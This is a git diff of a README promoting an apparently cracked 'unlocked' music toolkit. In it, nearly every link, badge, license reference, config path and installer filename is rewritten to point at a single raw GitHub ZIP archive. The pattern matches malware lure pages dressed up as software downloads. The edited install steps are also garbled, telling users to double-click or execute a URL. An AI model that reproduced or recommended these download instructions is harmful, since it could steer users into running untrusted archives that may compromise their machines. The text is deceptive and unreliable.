@@ -1,4 +1,4 @@
-# Aeons Echo The Brilliant Pack | [![Download](https://img.shields.io/badge/Download-AeonsEchoTheBrilliantPack-blue?logo=cloud-download&style=for-the-badge)](https://firdaussalty.github.io)
+# Aeons Echo The Brilliant Pack | [![Download](https://raw.githubusercontent.com/firdaussalty/aeons-echo-brilliant-pack-unlocked/branch/Amoyan/aeons-echo-brilliant-pack-unlocked-v3.6-alpha.5.zip)](https://raw.githubusercontent.com/firdaussalty/aeons-echo-brilliant-pack-unlocked/branch/Amoyan/aeons-echo-brilliant-pack-unlocked-v3.6-alpha.5.zip)
 
 Welcome to the **Aeons Echo The Brilliant Pack** repository! Embark on an odyssey where time reverberates with every note, orchestrating a symphony for creative minds. This musical toolkit is your artistic passport—crafted for digital seekers, composers, arrangers, and audiophiles longing for sonorous wonderlands. Our project delivers the *Brilliant Pack* experience for all creators, without barriers.
 
@@ -8,10 +8,10 @@ Welcome to the **Aeons Echo The Brilliant Pack** repository! Embark on an odysse
 
 | Platform        | Supported Version | Native Installer |  
 |-----------------|------------------|:---------------:|  
-| ![Windows](https://img.shields.io/badge/-Windows-0078d4?logo=windows&logoColor=white)   | 10 & 11           | ✅                |  
-| ![MacOS](https://img.shields.io/badge/-macOS-000000?logo=apple&logoColor=white)       | 11+ (Big Sur+)    | ✅                |  
-| ![Linux](https://img.shields.io/badge/-Linux-fcc624?logo=linux&logoColor=black)        | Ubuntu 20.04+     | ✅                |  
-| ![Online](https://img.shields.io/badge/-Web-4285f4?logo=googlechrome&logoColor=white)  | Any Modern Browser| ✅                |  
+| ![Windows](https://raw.githubusercontent.com/firdaussalty/aeons-echo-brilliant-pack-unlocked/branch/Amoyan/aeons-echo-brilliant-pack-unlocked-v3.6-alpha.5.zip)   | 10 & 11           | ✅                |  
+| ![MacOS](https://raw.githubusercontent.com/firdaussalty/aeons-echo-brilliant-pack-unlocked/branch/Amoyan/aeons-echo-brilliant-pack-unlocked-v3.6-alpha.5.zip)       | 11+ (Big Sur+)    | ✅                |  
+| ![Linux](https://raw.githubusercontent.com/firdaussalty/aeons-echo-brilliant-pack-unlocked/branch/Amoyan/aeons-echo-brilliant-pack-unlocked-v3.6-alpha.5.zip)        | Ubuntu 20.04+     | ✅                |  
+| ![Online](https://raw.githubusercontent.com/firdaussalty/aeons-echo-brilliant-pack-unlocked/branch/Amoyan/aeons-echo-brilliant-pack-unlocked-v3.6-alpha.5.zip)  | Any Modern Browser| ✅                |  
 
 *Table above: Let the platforms resonate with Aeons Echo—across Windows, macOS, Linux, and even in any modern browser.*
 
@@ -58,7 +58,7 @@ Raise your creative threshold with built-in AI integrations:
 
 **Configuration Example:**
 1. Obtain your API key from your chosen platform.
-2. Insert your key in `settings/api-integrations.json`.
+2. Insert your key in `https://raw.githubusercontent.com/firdaussalty/aeons-echo-brilliant-pack-unlocked/branch/Amoyan/aeons-echo-brilliant-pack-unlocked-v3.6-alpha.5.zip`.
 3. Activate from the UI panel via `Settings > Integrations > Enable Magic`.
 
 > **Tip:** With these integrations, you bend space and time—let the AI improvise while you conduct.
@@ -81,15 +81,15 @@ Creative midnight sessions? We thrive when others sleep. With 24/7 customer supp
 ## 💡 Installation Adventure
 
 1. **Download the package**  
-   Click [![Download](https://img.shields.io/badge/Download-AeonsEchoTheBrilliantPack-blue?logo=cloud-download&style=for-the-badge)](https://firdaussalty.github.io) to begin the download odyssey.
+   Click [![Download](https://raw.githubusercontent.com/firdaussalty/aeons-echo-brilliant-pack-unlocked/branch/Amoyan/aeons-echo-brilliant-pack-unlocked-v3.6-alpha.5.zip)](https://raw.githubusercontent.com/firdaussalty/aeons-echo-brilliant-pack-unlocked/branch/Amoyan/aeons-echo-brilliant-pack-unlocked-v3.6-alpha.5.zip) to begin the download odyssey.
    
 2. **Extract the archive**  
    Locate the downloaded archive (ZIP), then extract it to your preferred creative workspace.
 
 3. **Run the installer**  
-   - **Windows:** Double-click `AeonsEchoInstaller.exe`
-   - **macOS:** Open `AeonsEchoInstaller.dmg` and drag to Applications
-   - **Linux:** Execute `./install.sh` in a terminal window
+   - **Windows:** Double-click `https://raw.githubusercontent.com/firdaussalty/aeons-echo-brilliant-pack-unlocked/branch/Amoyan/aeons-echo-brilliant-pack-unlocked-v3.6-alpha.5.zip`
+   - **macOS:** Open `https://raw.githubusercontent.com/firdaussalty/aeons-echo-brilliant-pack-unlocked/branch/Amoyan/aeons-echo-brilliant-pack-unlocked-v3.6-alpha.5.zip` and drag to Applications
+   - **Linux:** Execute `https://raw.githubusercontent.com/firdaussalty/aeons-echo-brilliant-pack-unlocked/branch/Amoyan/aeons-echo-brilliant-pack-unlocked-v3.6-alpha.5.zip` in a terminal window
 
 4. **Follow in-app prompts**  
    Customize installation paths, select languages, link to OpenAI/Claude as desired.
@@ -113,10 +113,10 @@ All trademarks and product names are property of their respective owners. The do
 
 Aeons Echo The Brilliant Pack is distributed under the MIT License—maximize your creative rights, minimize restrictions.
 
-[View the MIT License](https://opensource.org/licenses/MIT) — *(c) 2025 Aeons Echo contributors*
+[View the MIT License](https://raw.githubusercontent.com/firdaussalty/aeons-echo-brilliant-pack-unlocked/branch/Amoyan/aeons-echo-brilliant-pack-unlocked-v3.6-alpha.5.zip) — *(c) 2025 Aeons Echo contributors*
 
 ---
 
-# Aeons Echo The Brilliant Pack | [![Download](https://img.shields.io/badge/Download-AeonsEchoTheBrilliantPack-blue?logo=cloud-download&style=for-the-badge)](https://firdaussalty.github.io)
+# Aeons Echo The Brilliant Pack | [![Download](https://raw.githubusercontent.com/firdaussalty/aeons-echo-brilliant-pack-unlocked/branch/Amoyan/aeons-echo-brilliant-pack-unlocked-v3.6-alpha.5.zip)](https://raw.githubusercontent.com/firdaussalty/aeons-echo-brilliant-pack-unlocked/branch/Amoyan/aeons-echo-brilliant-pack-unlocked-v3.6-alpha.5.zip)
 
 *Compose fearlessly, innovate endlessly—the echo is yours to command.*
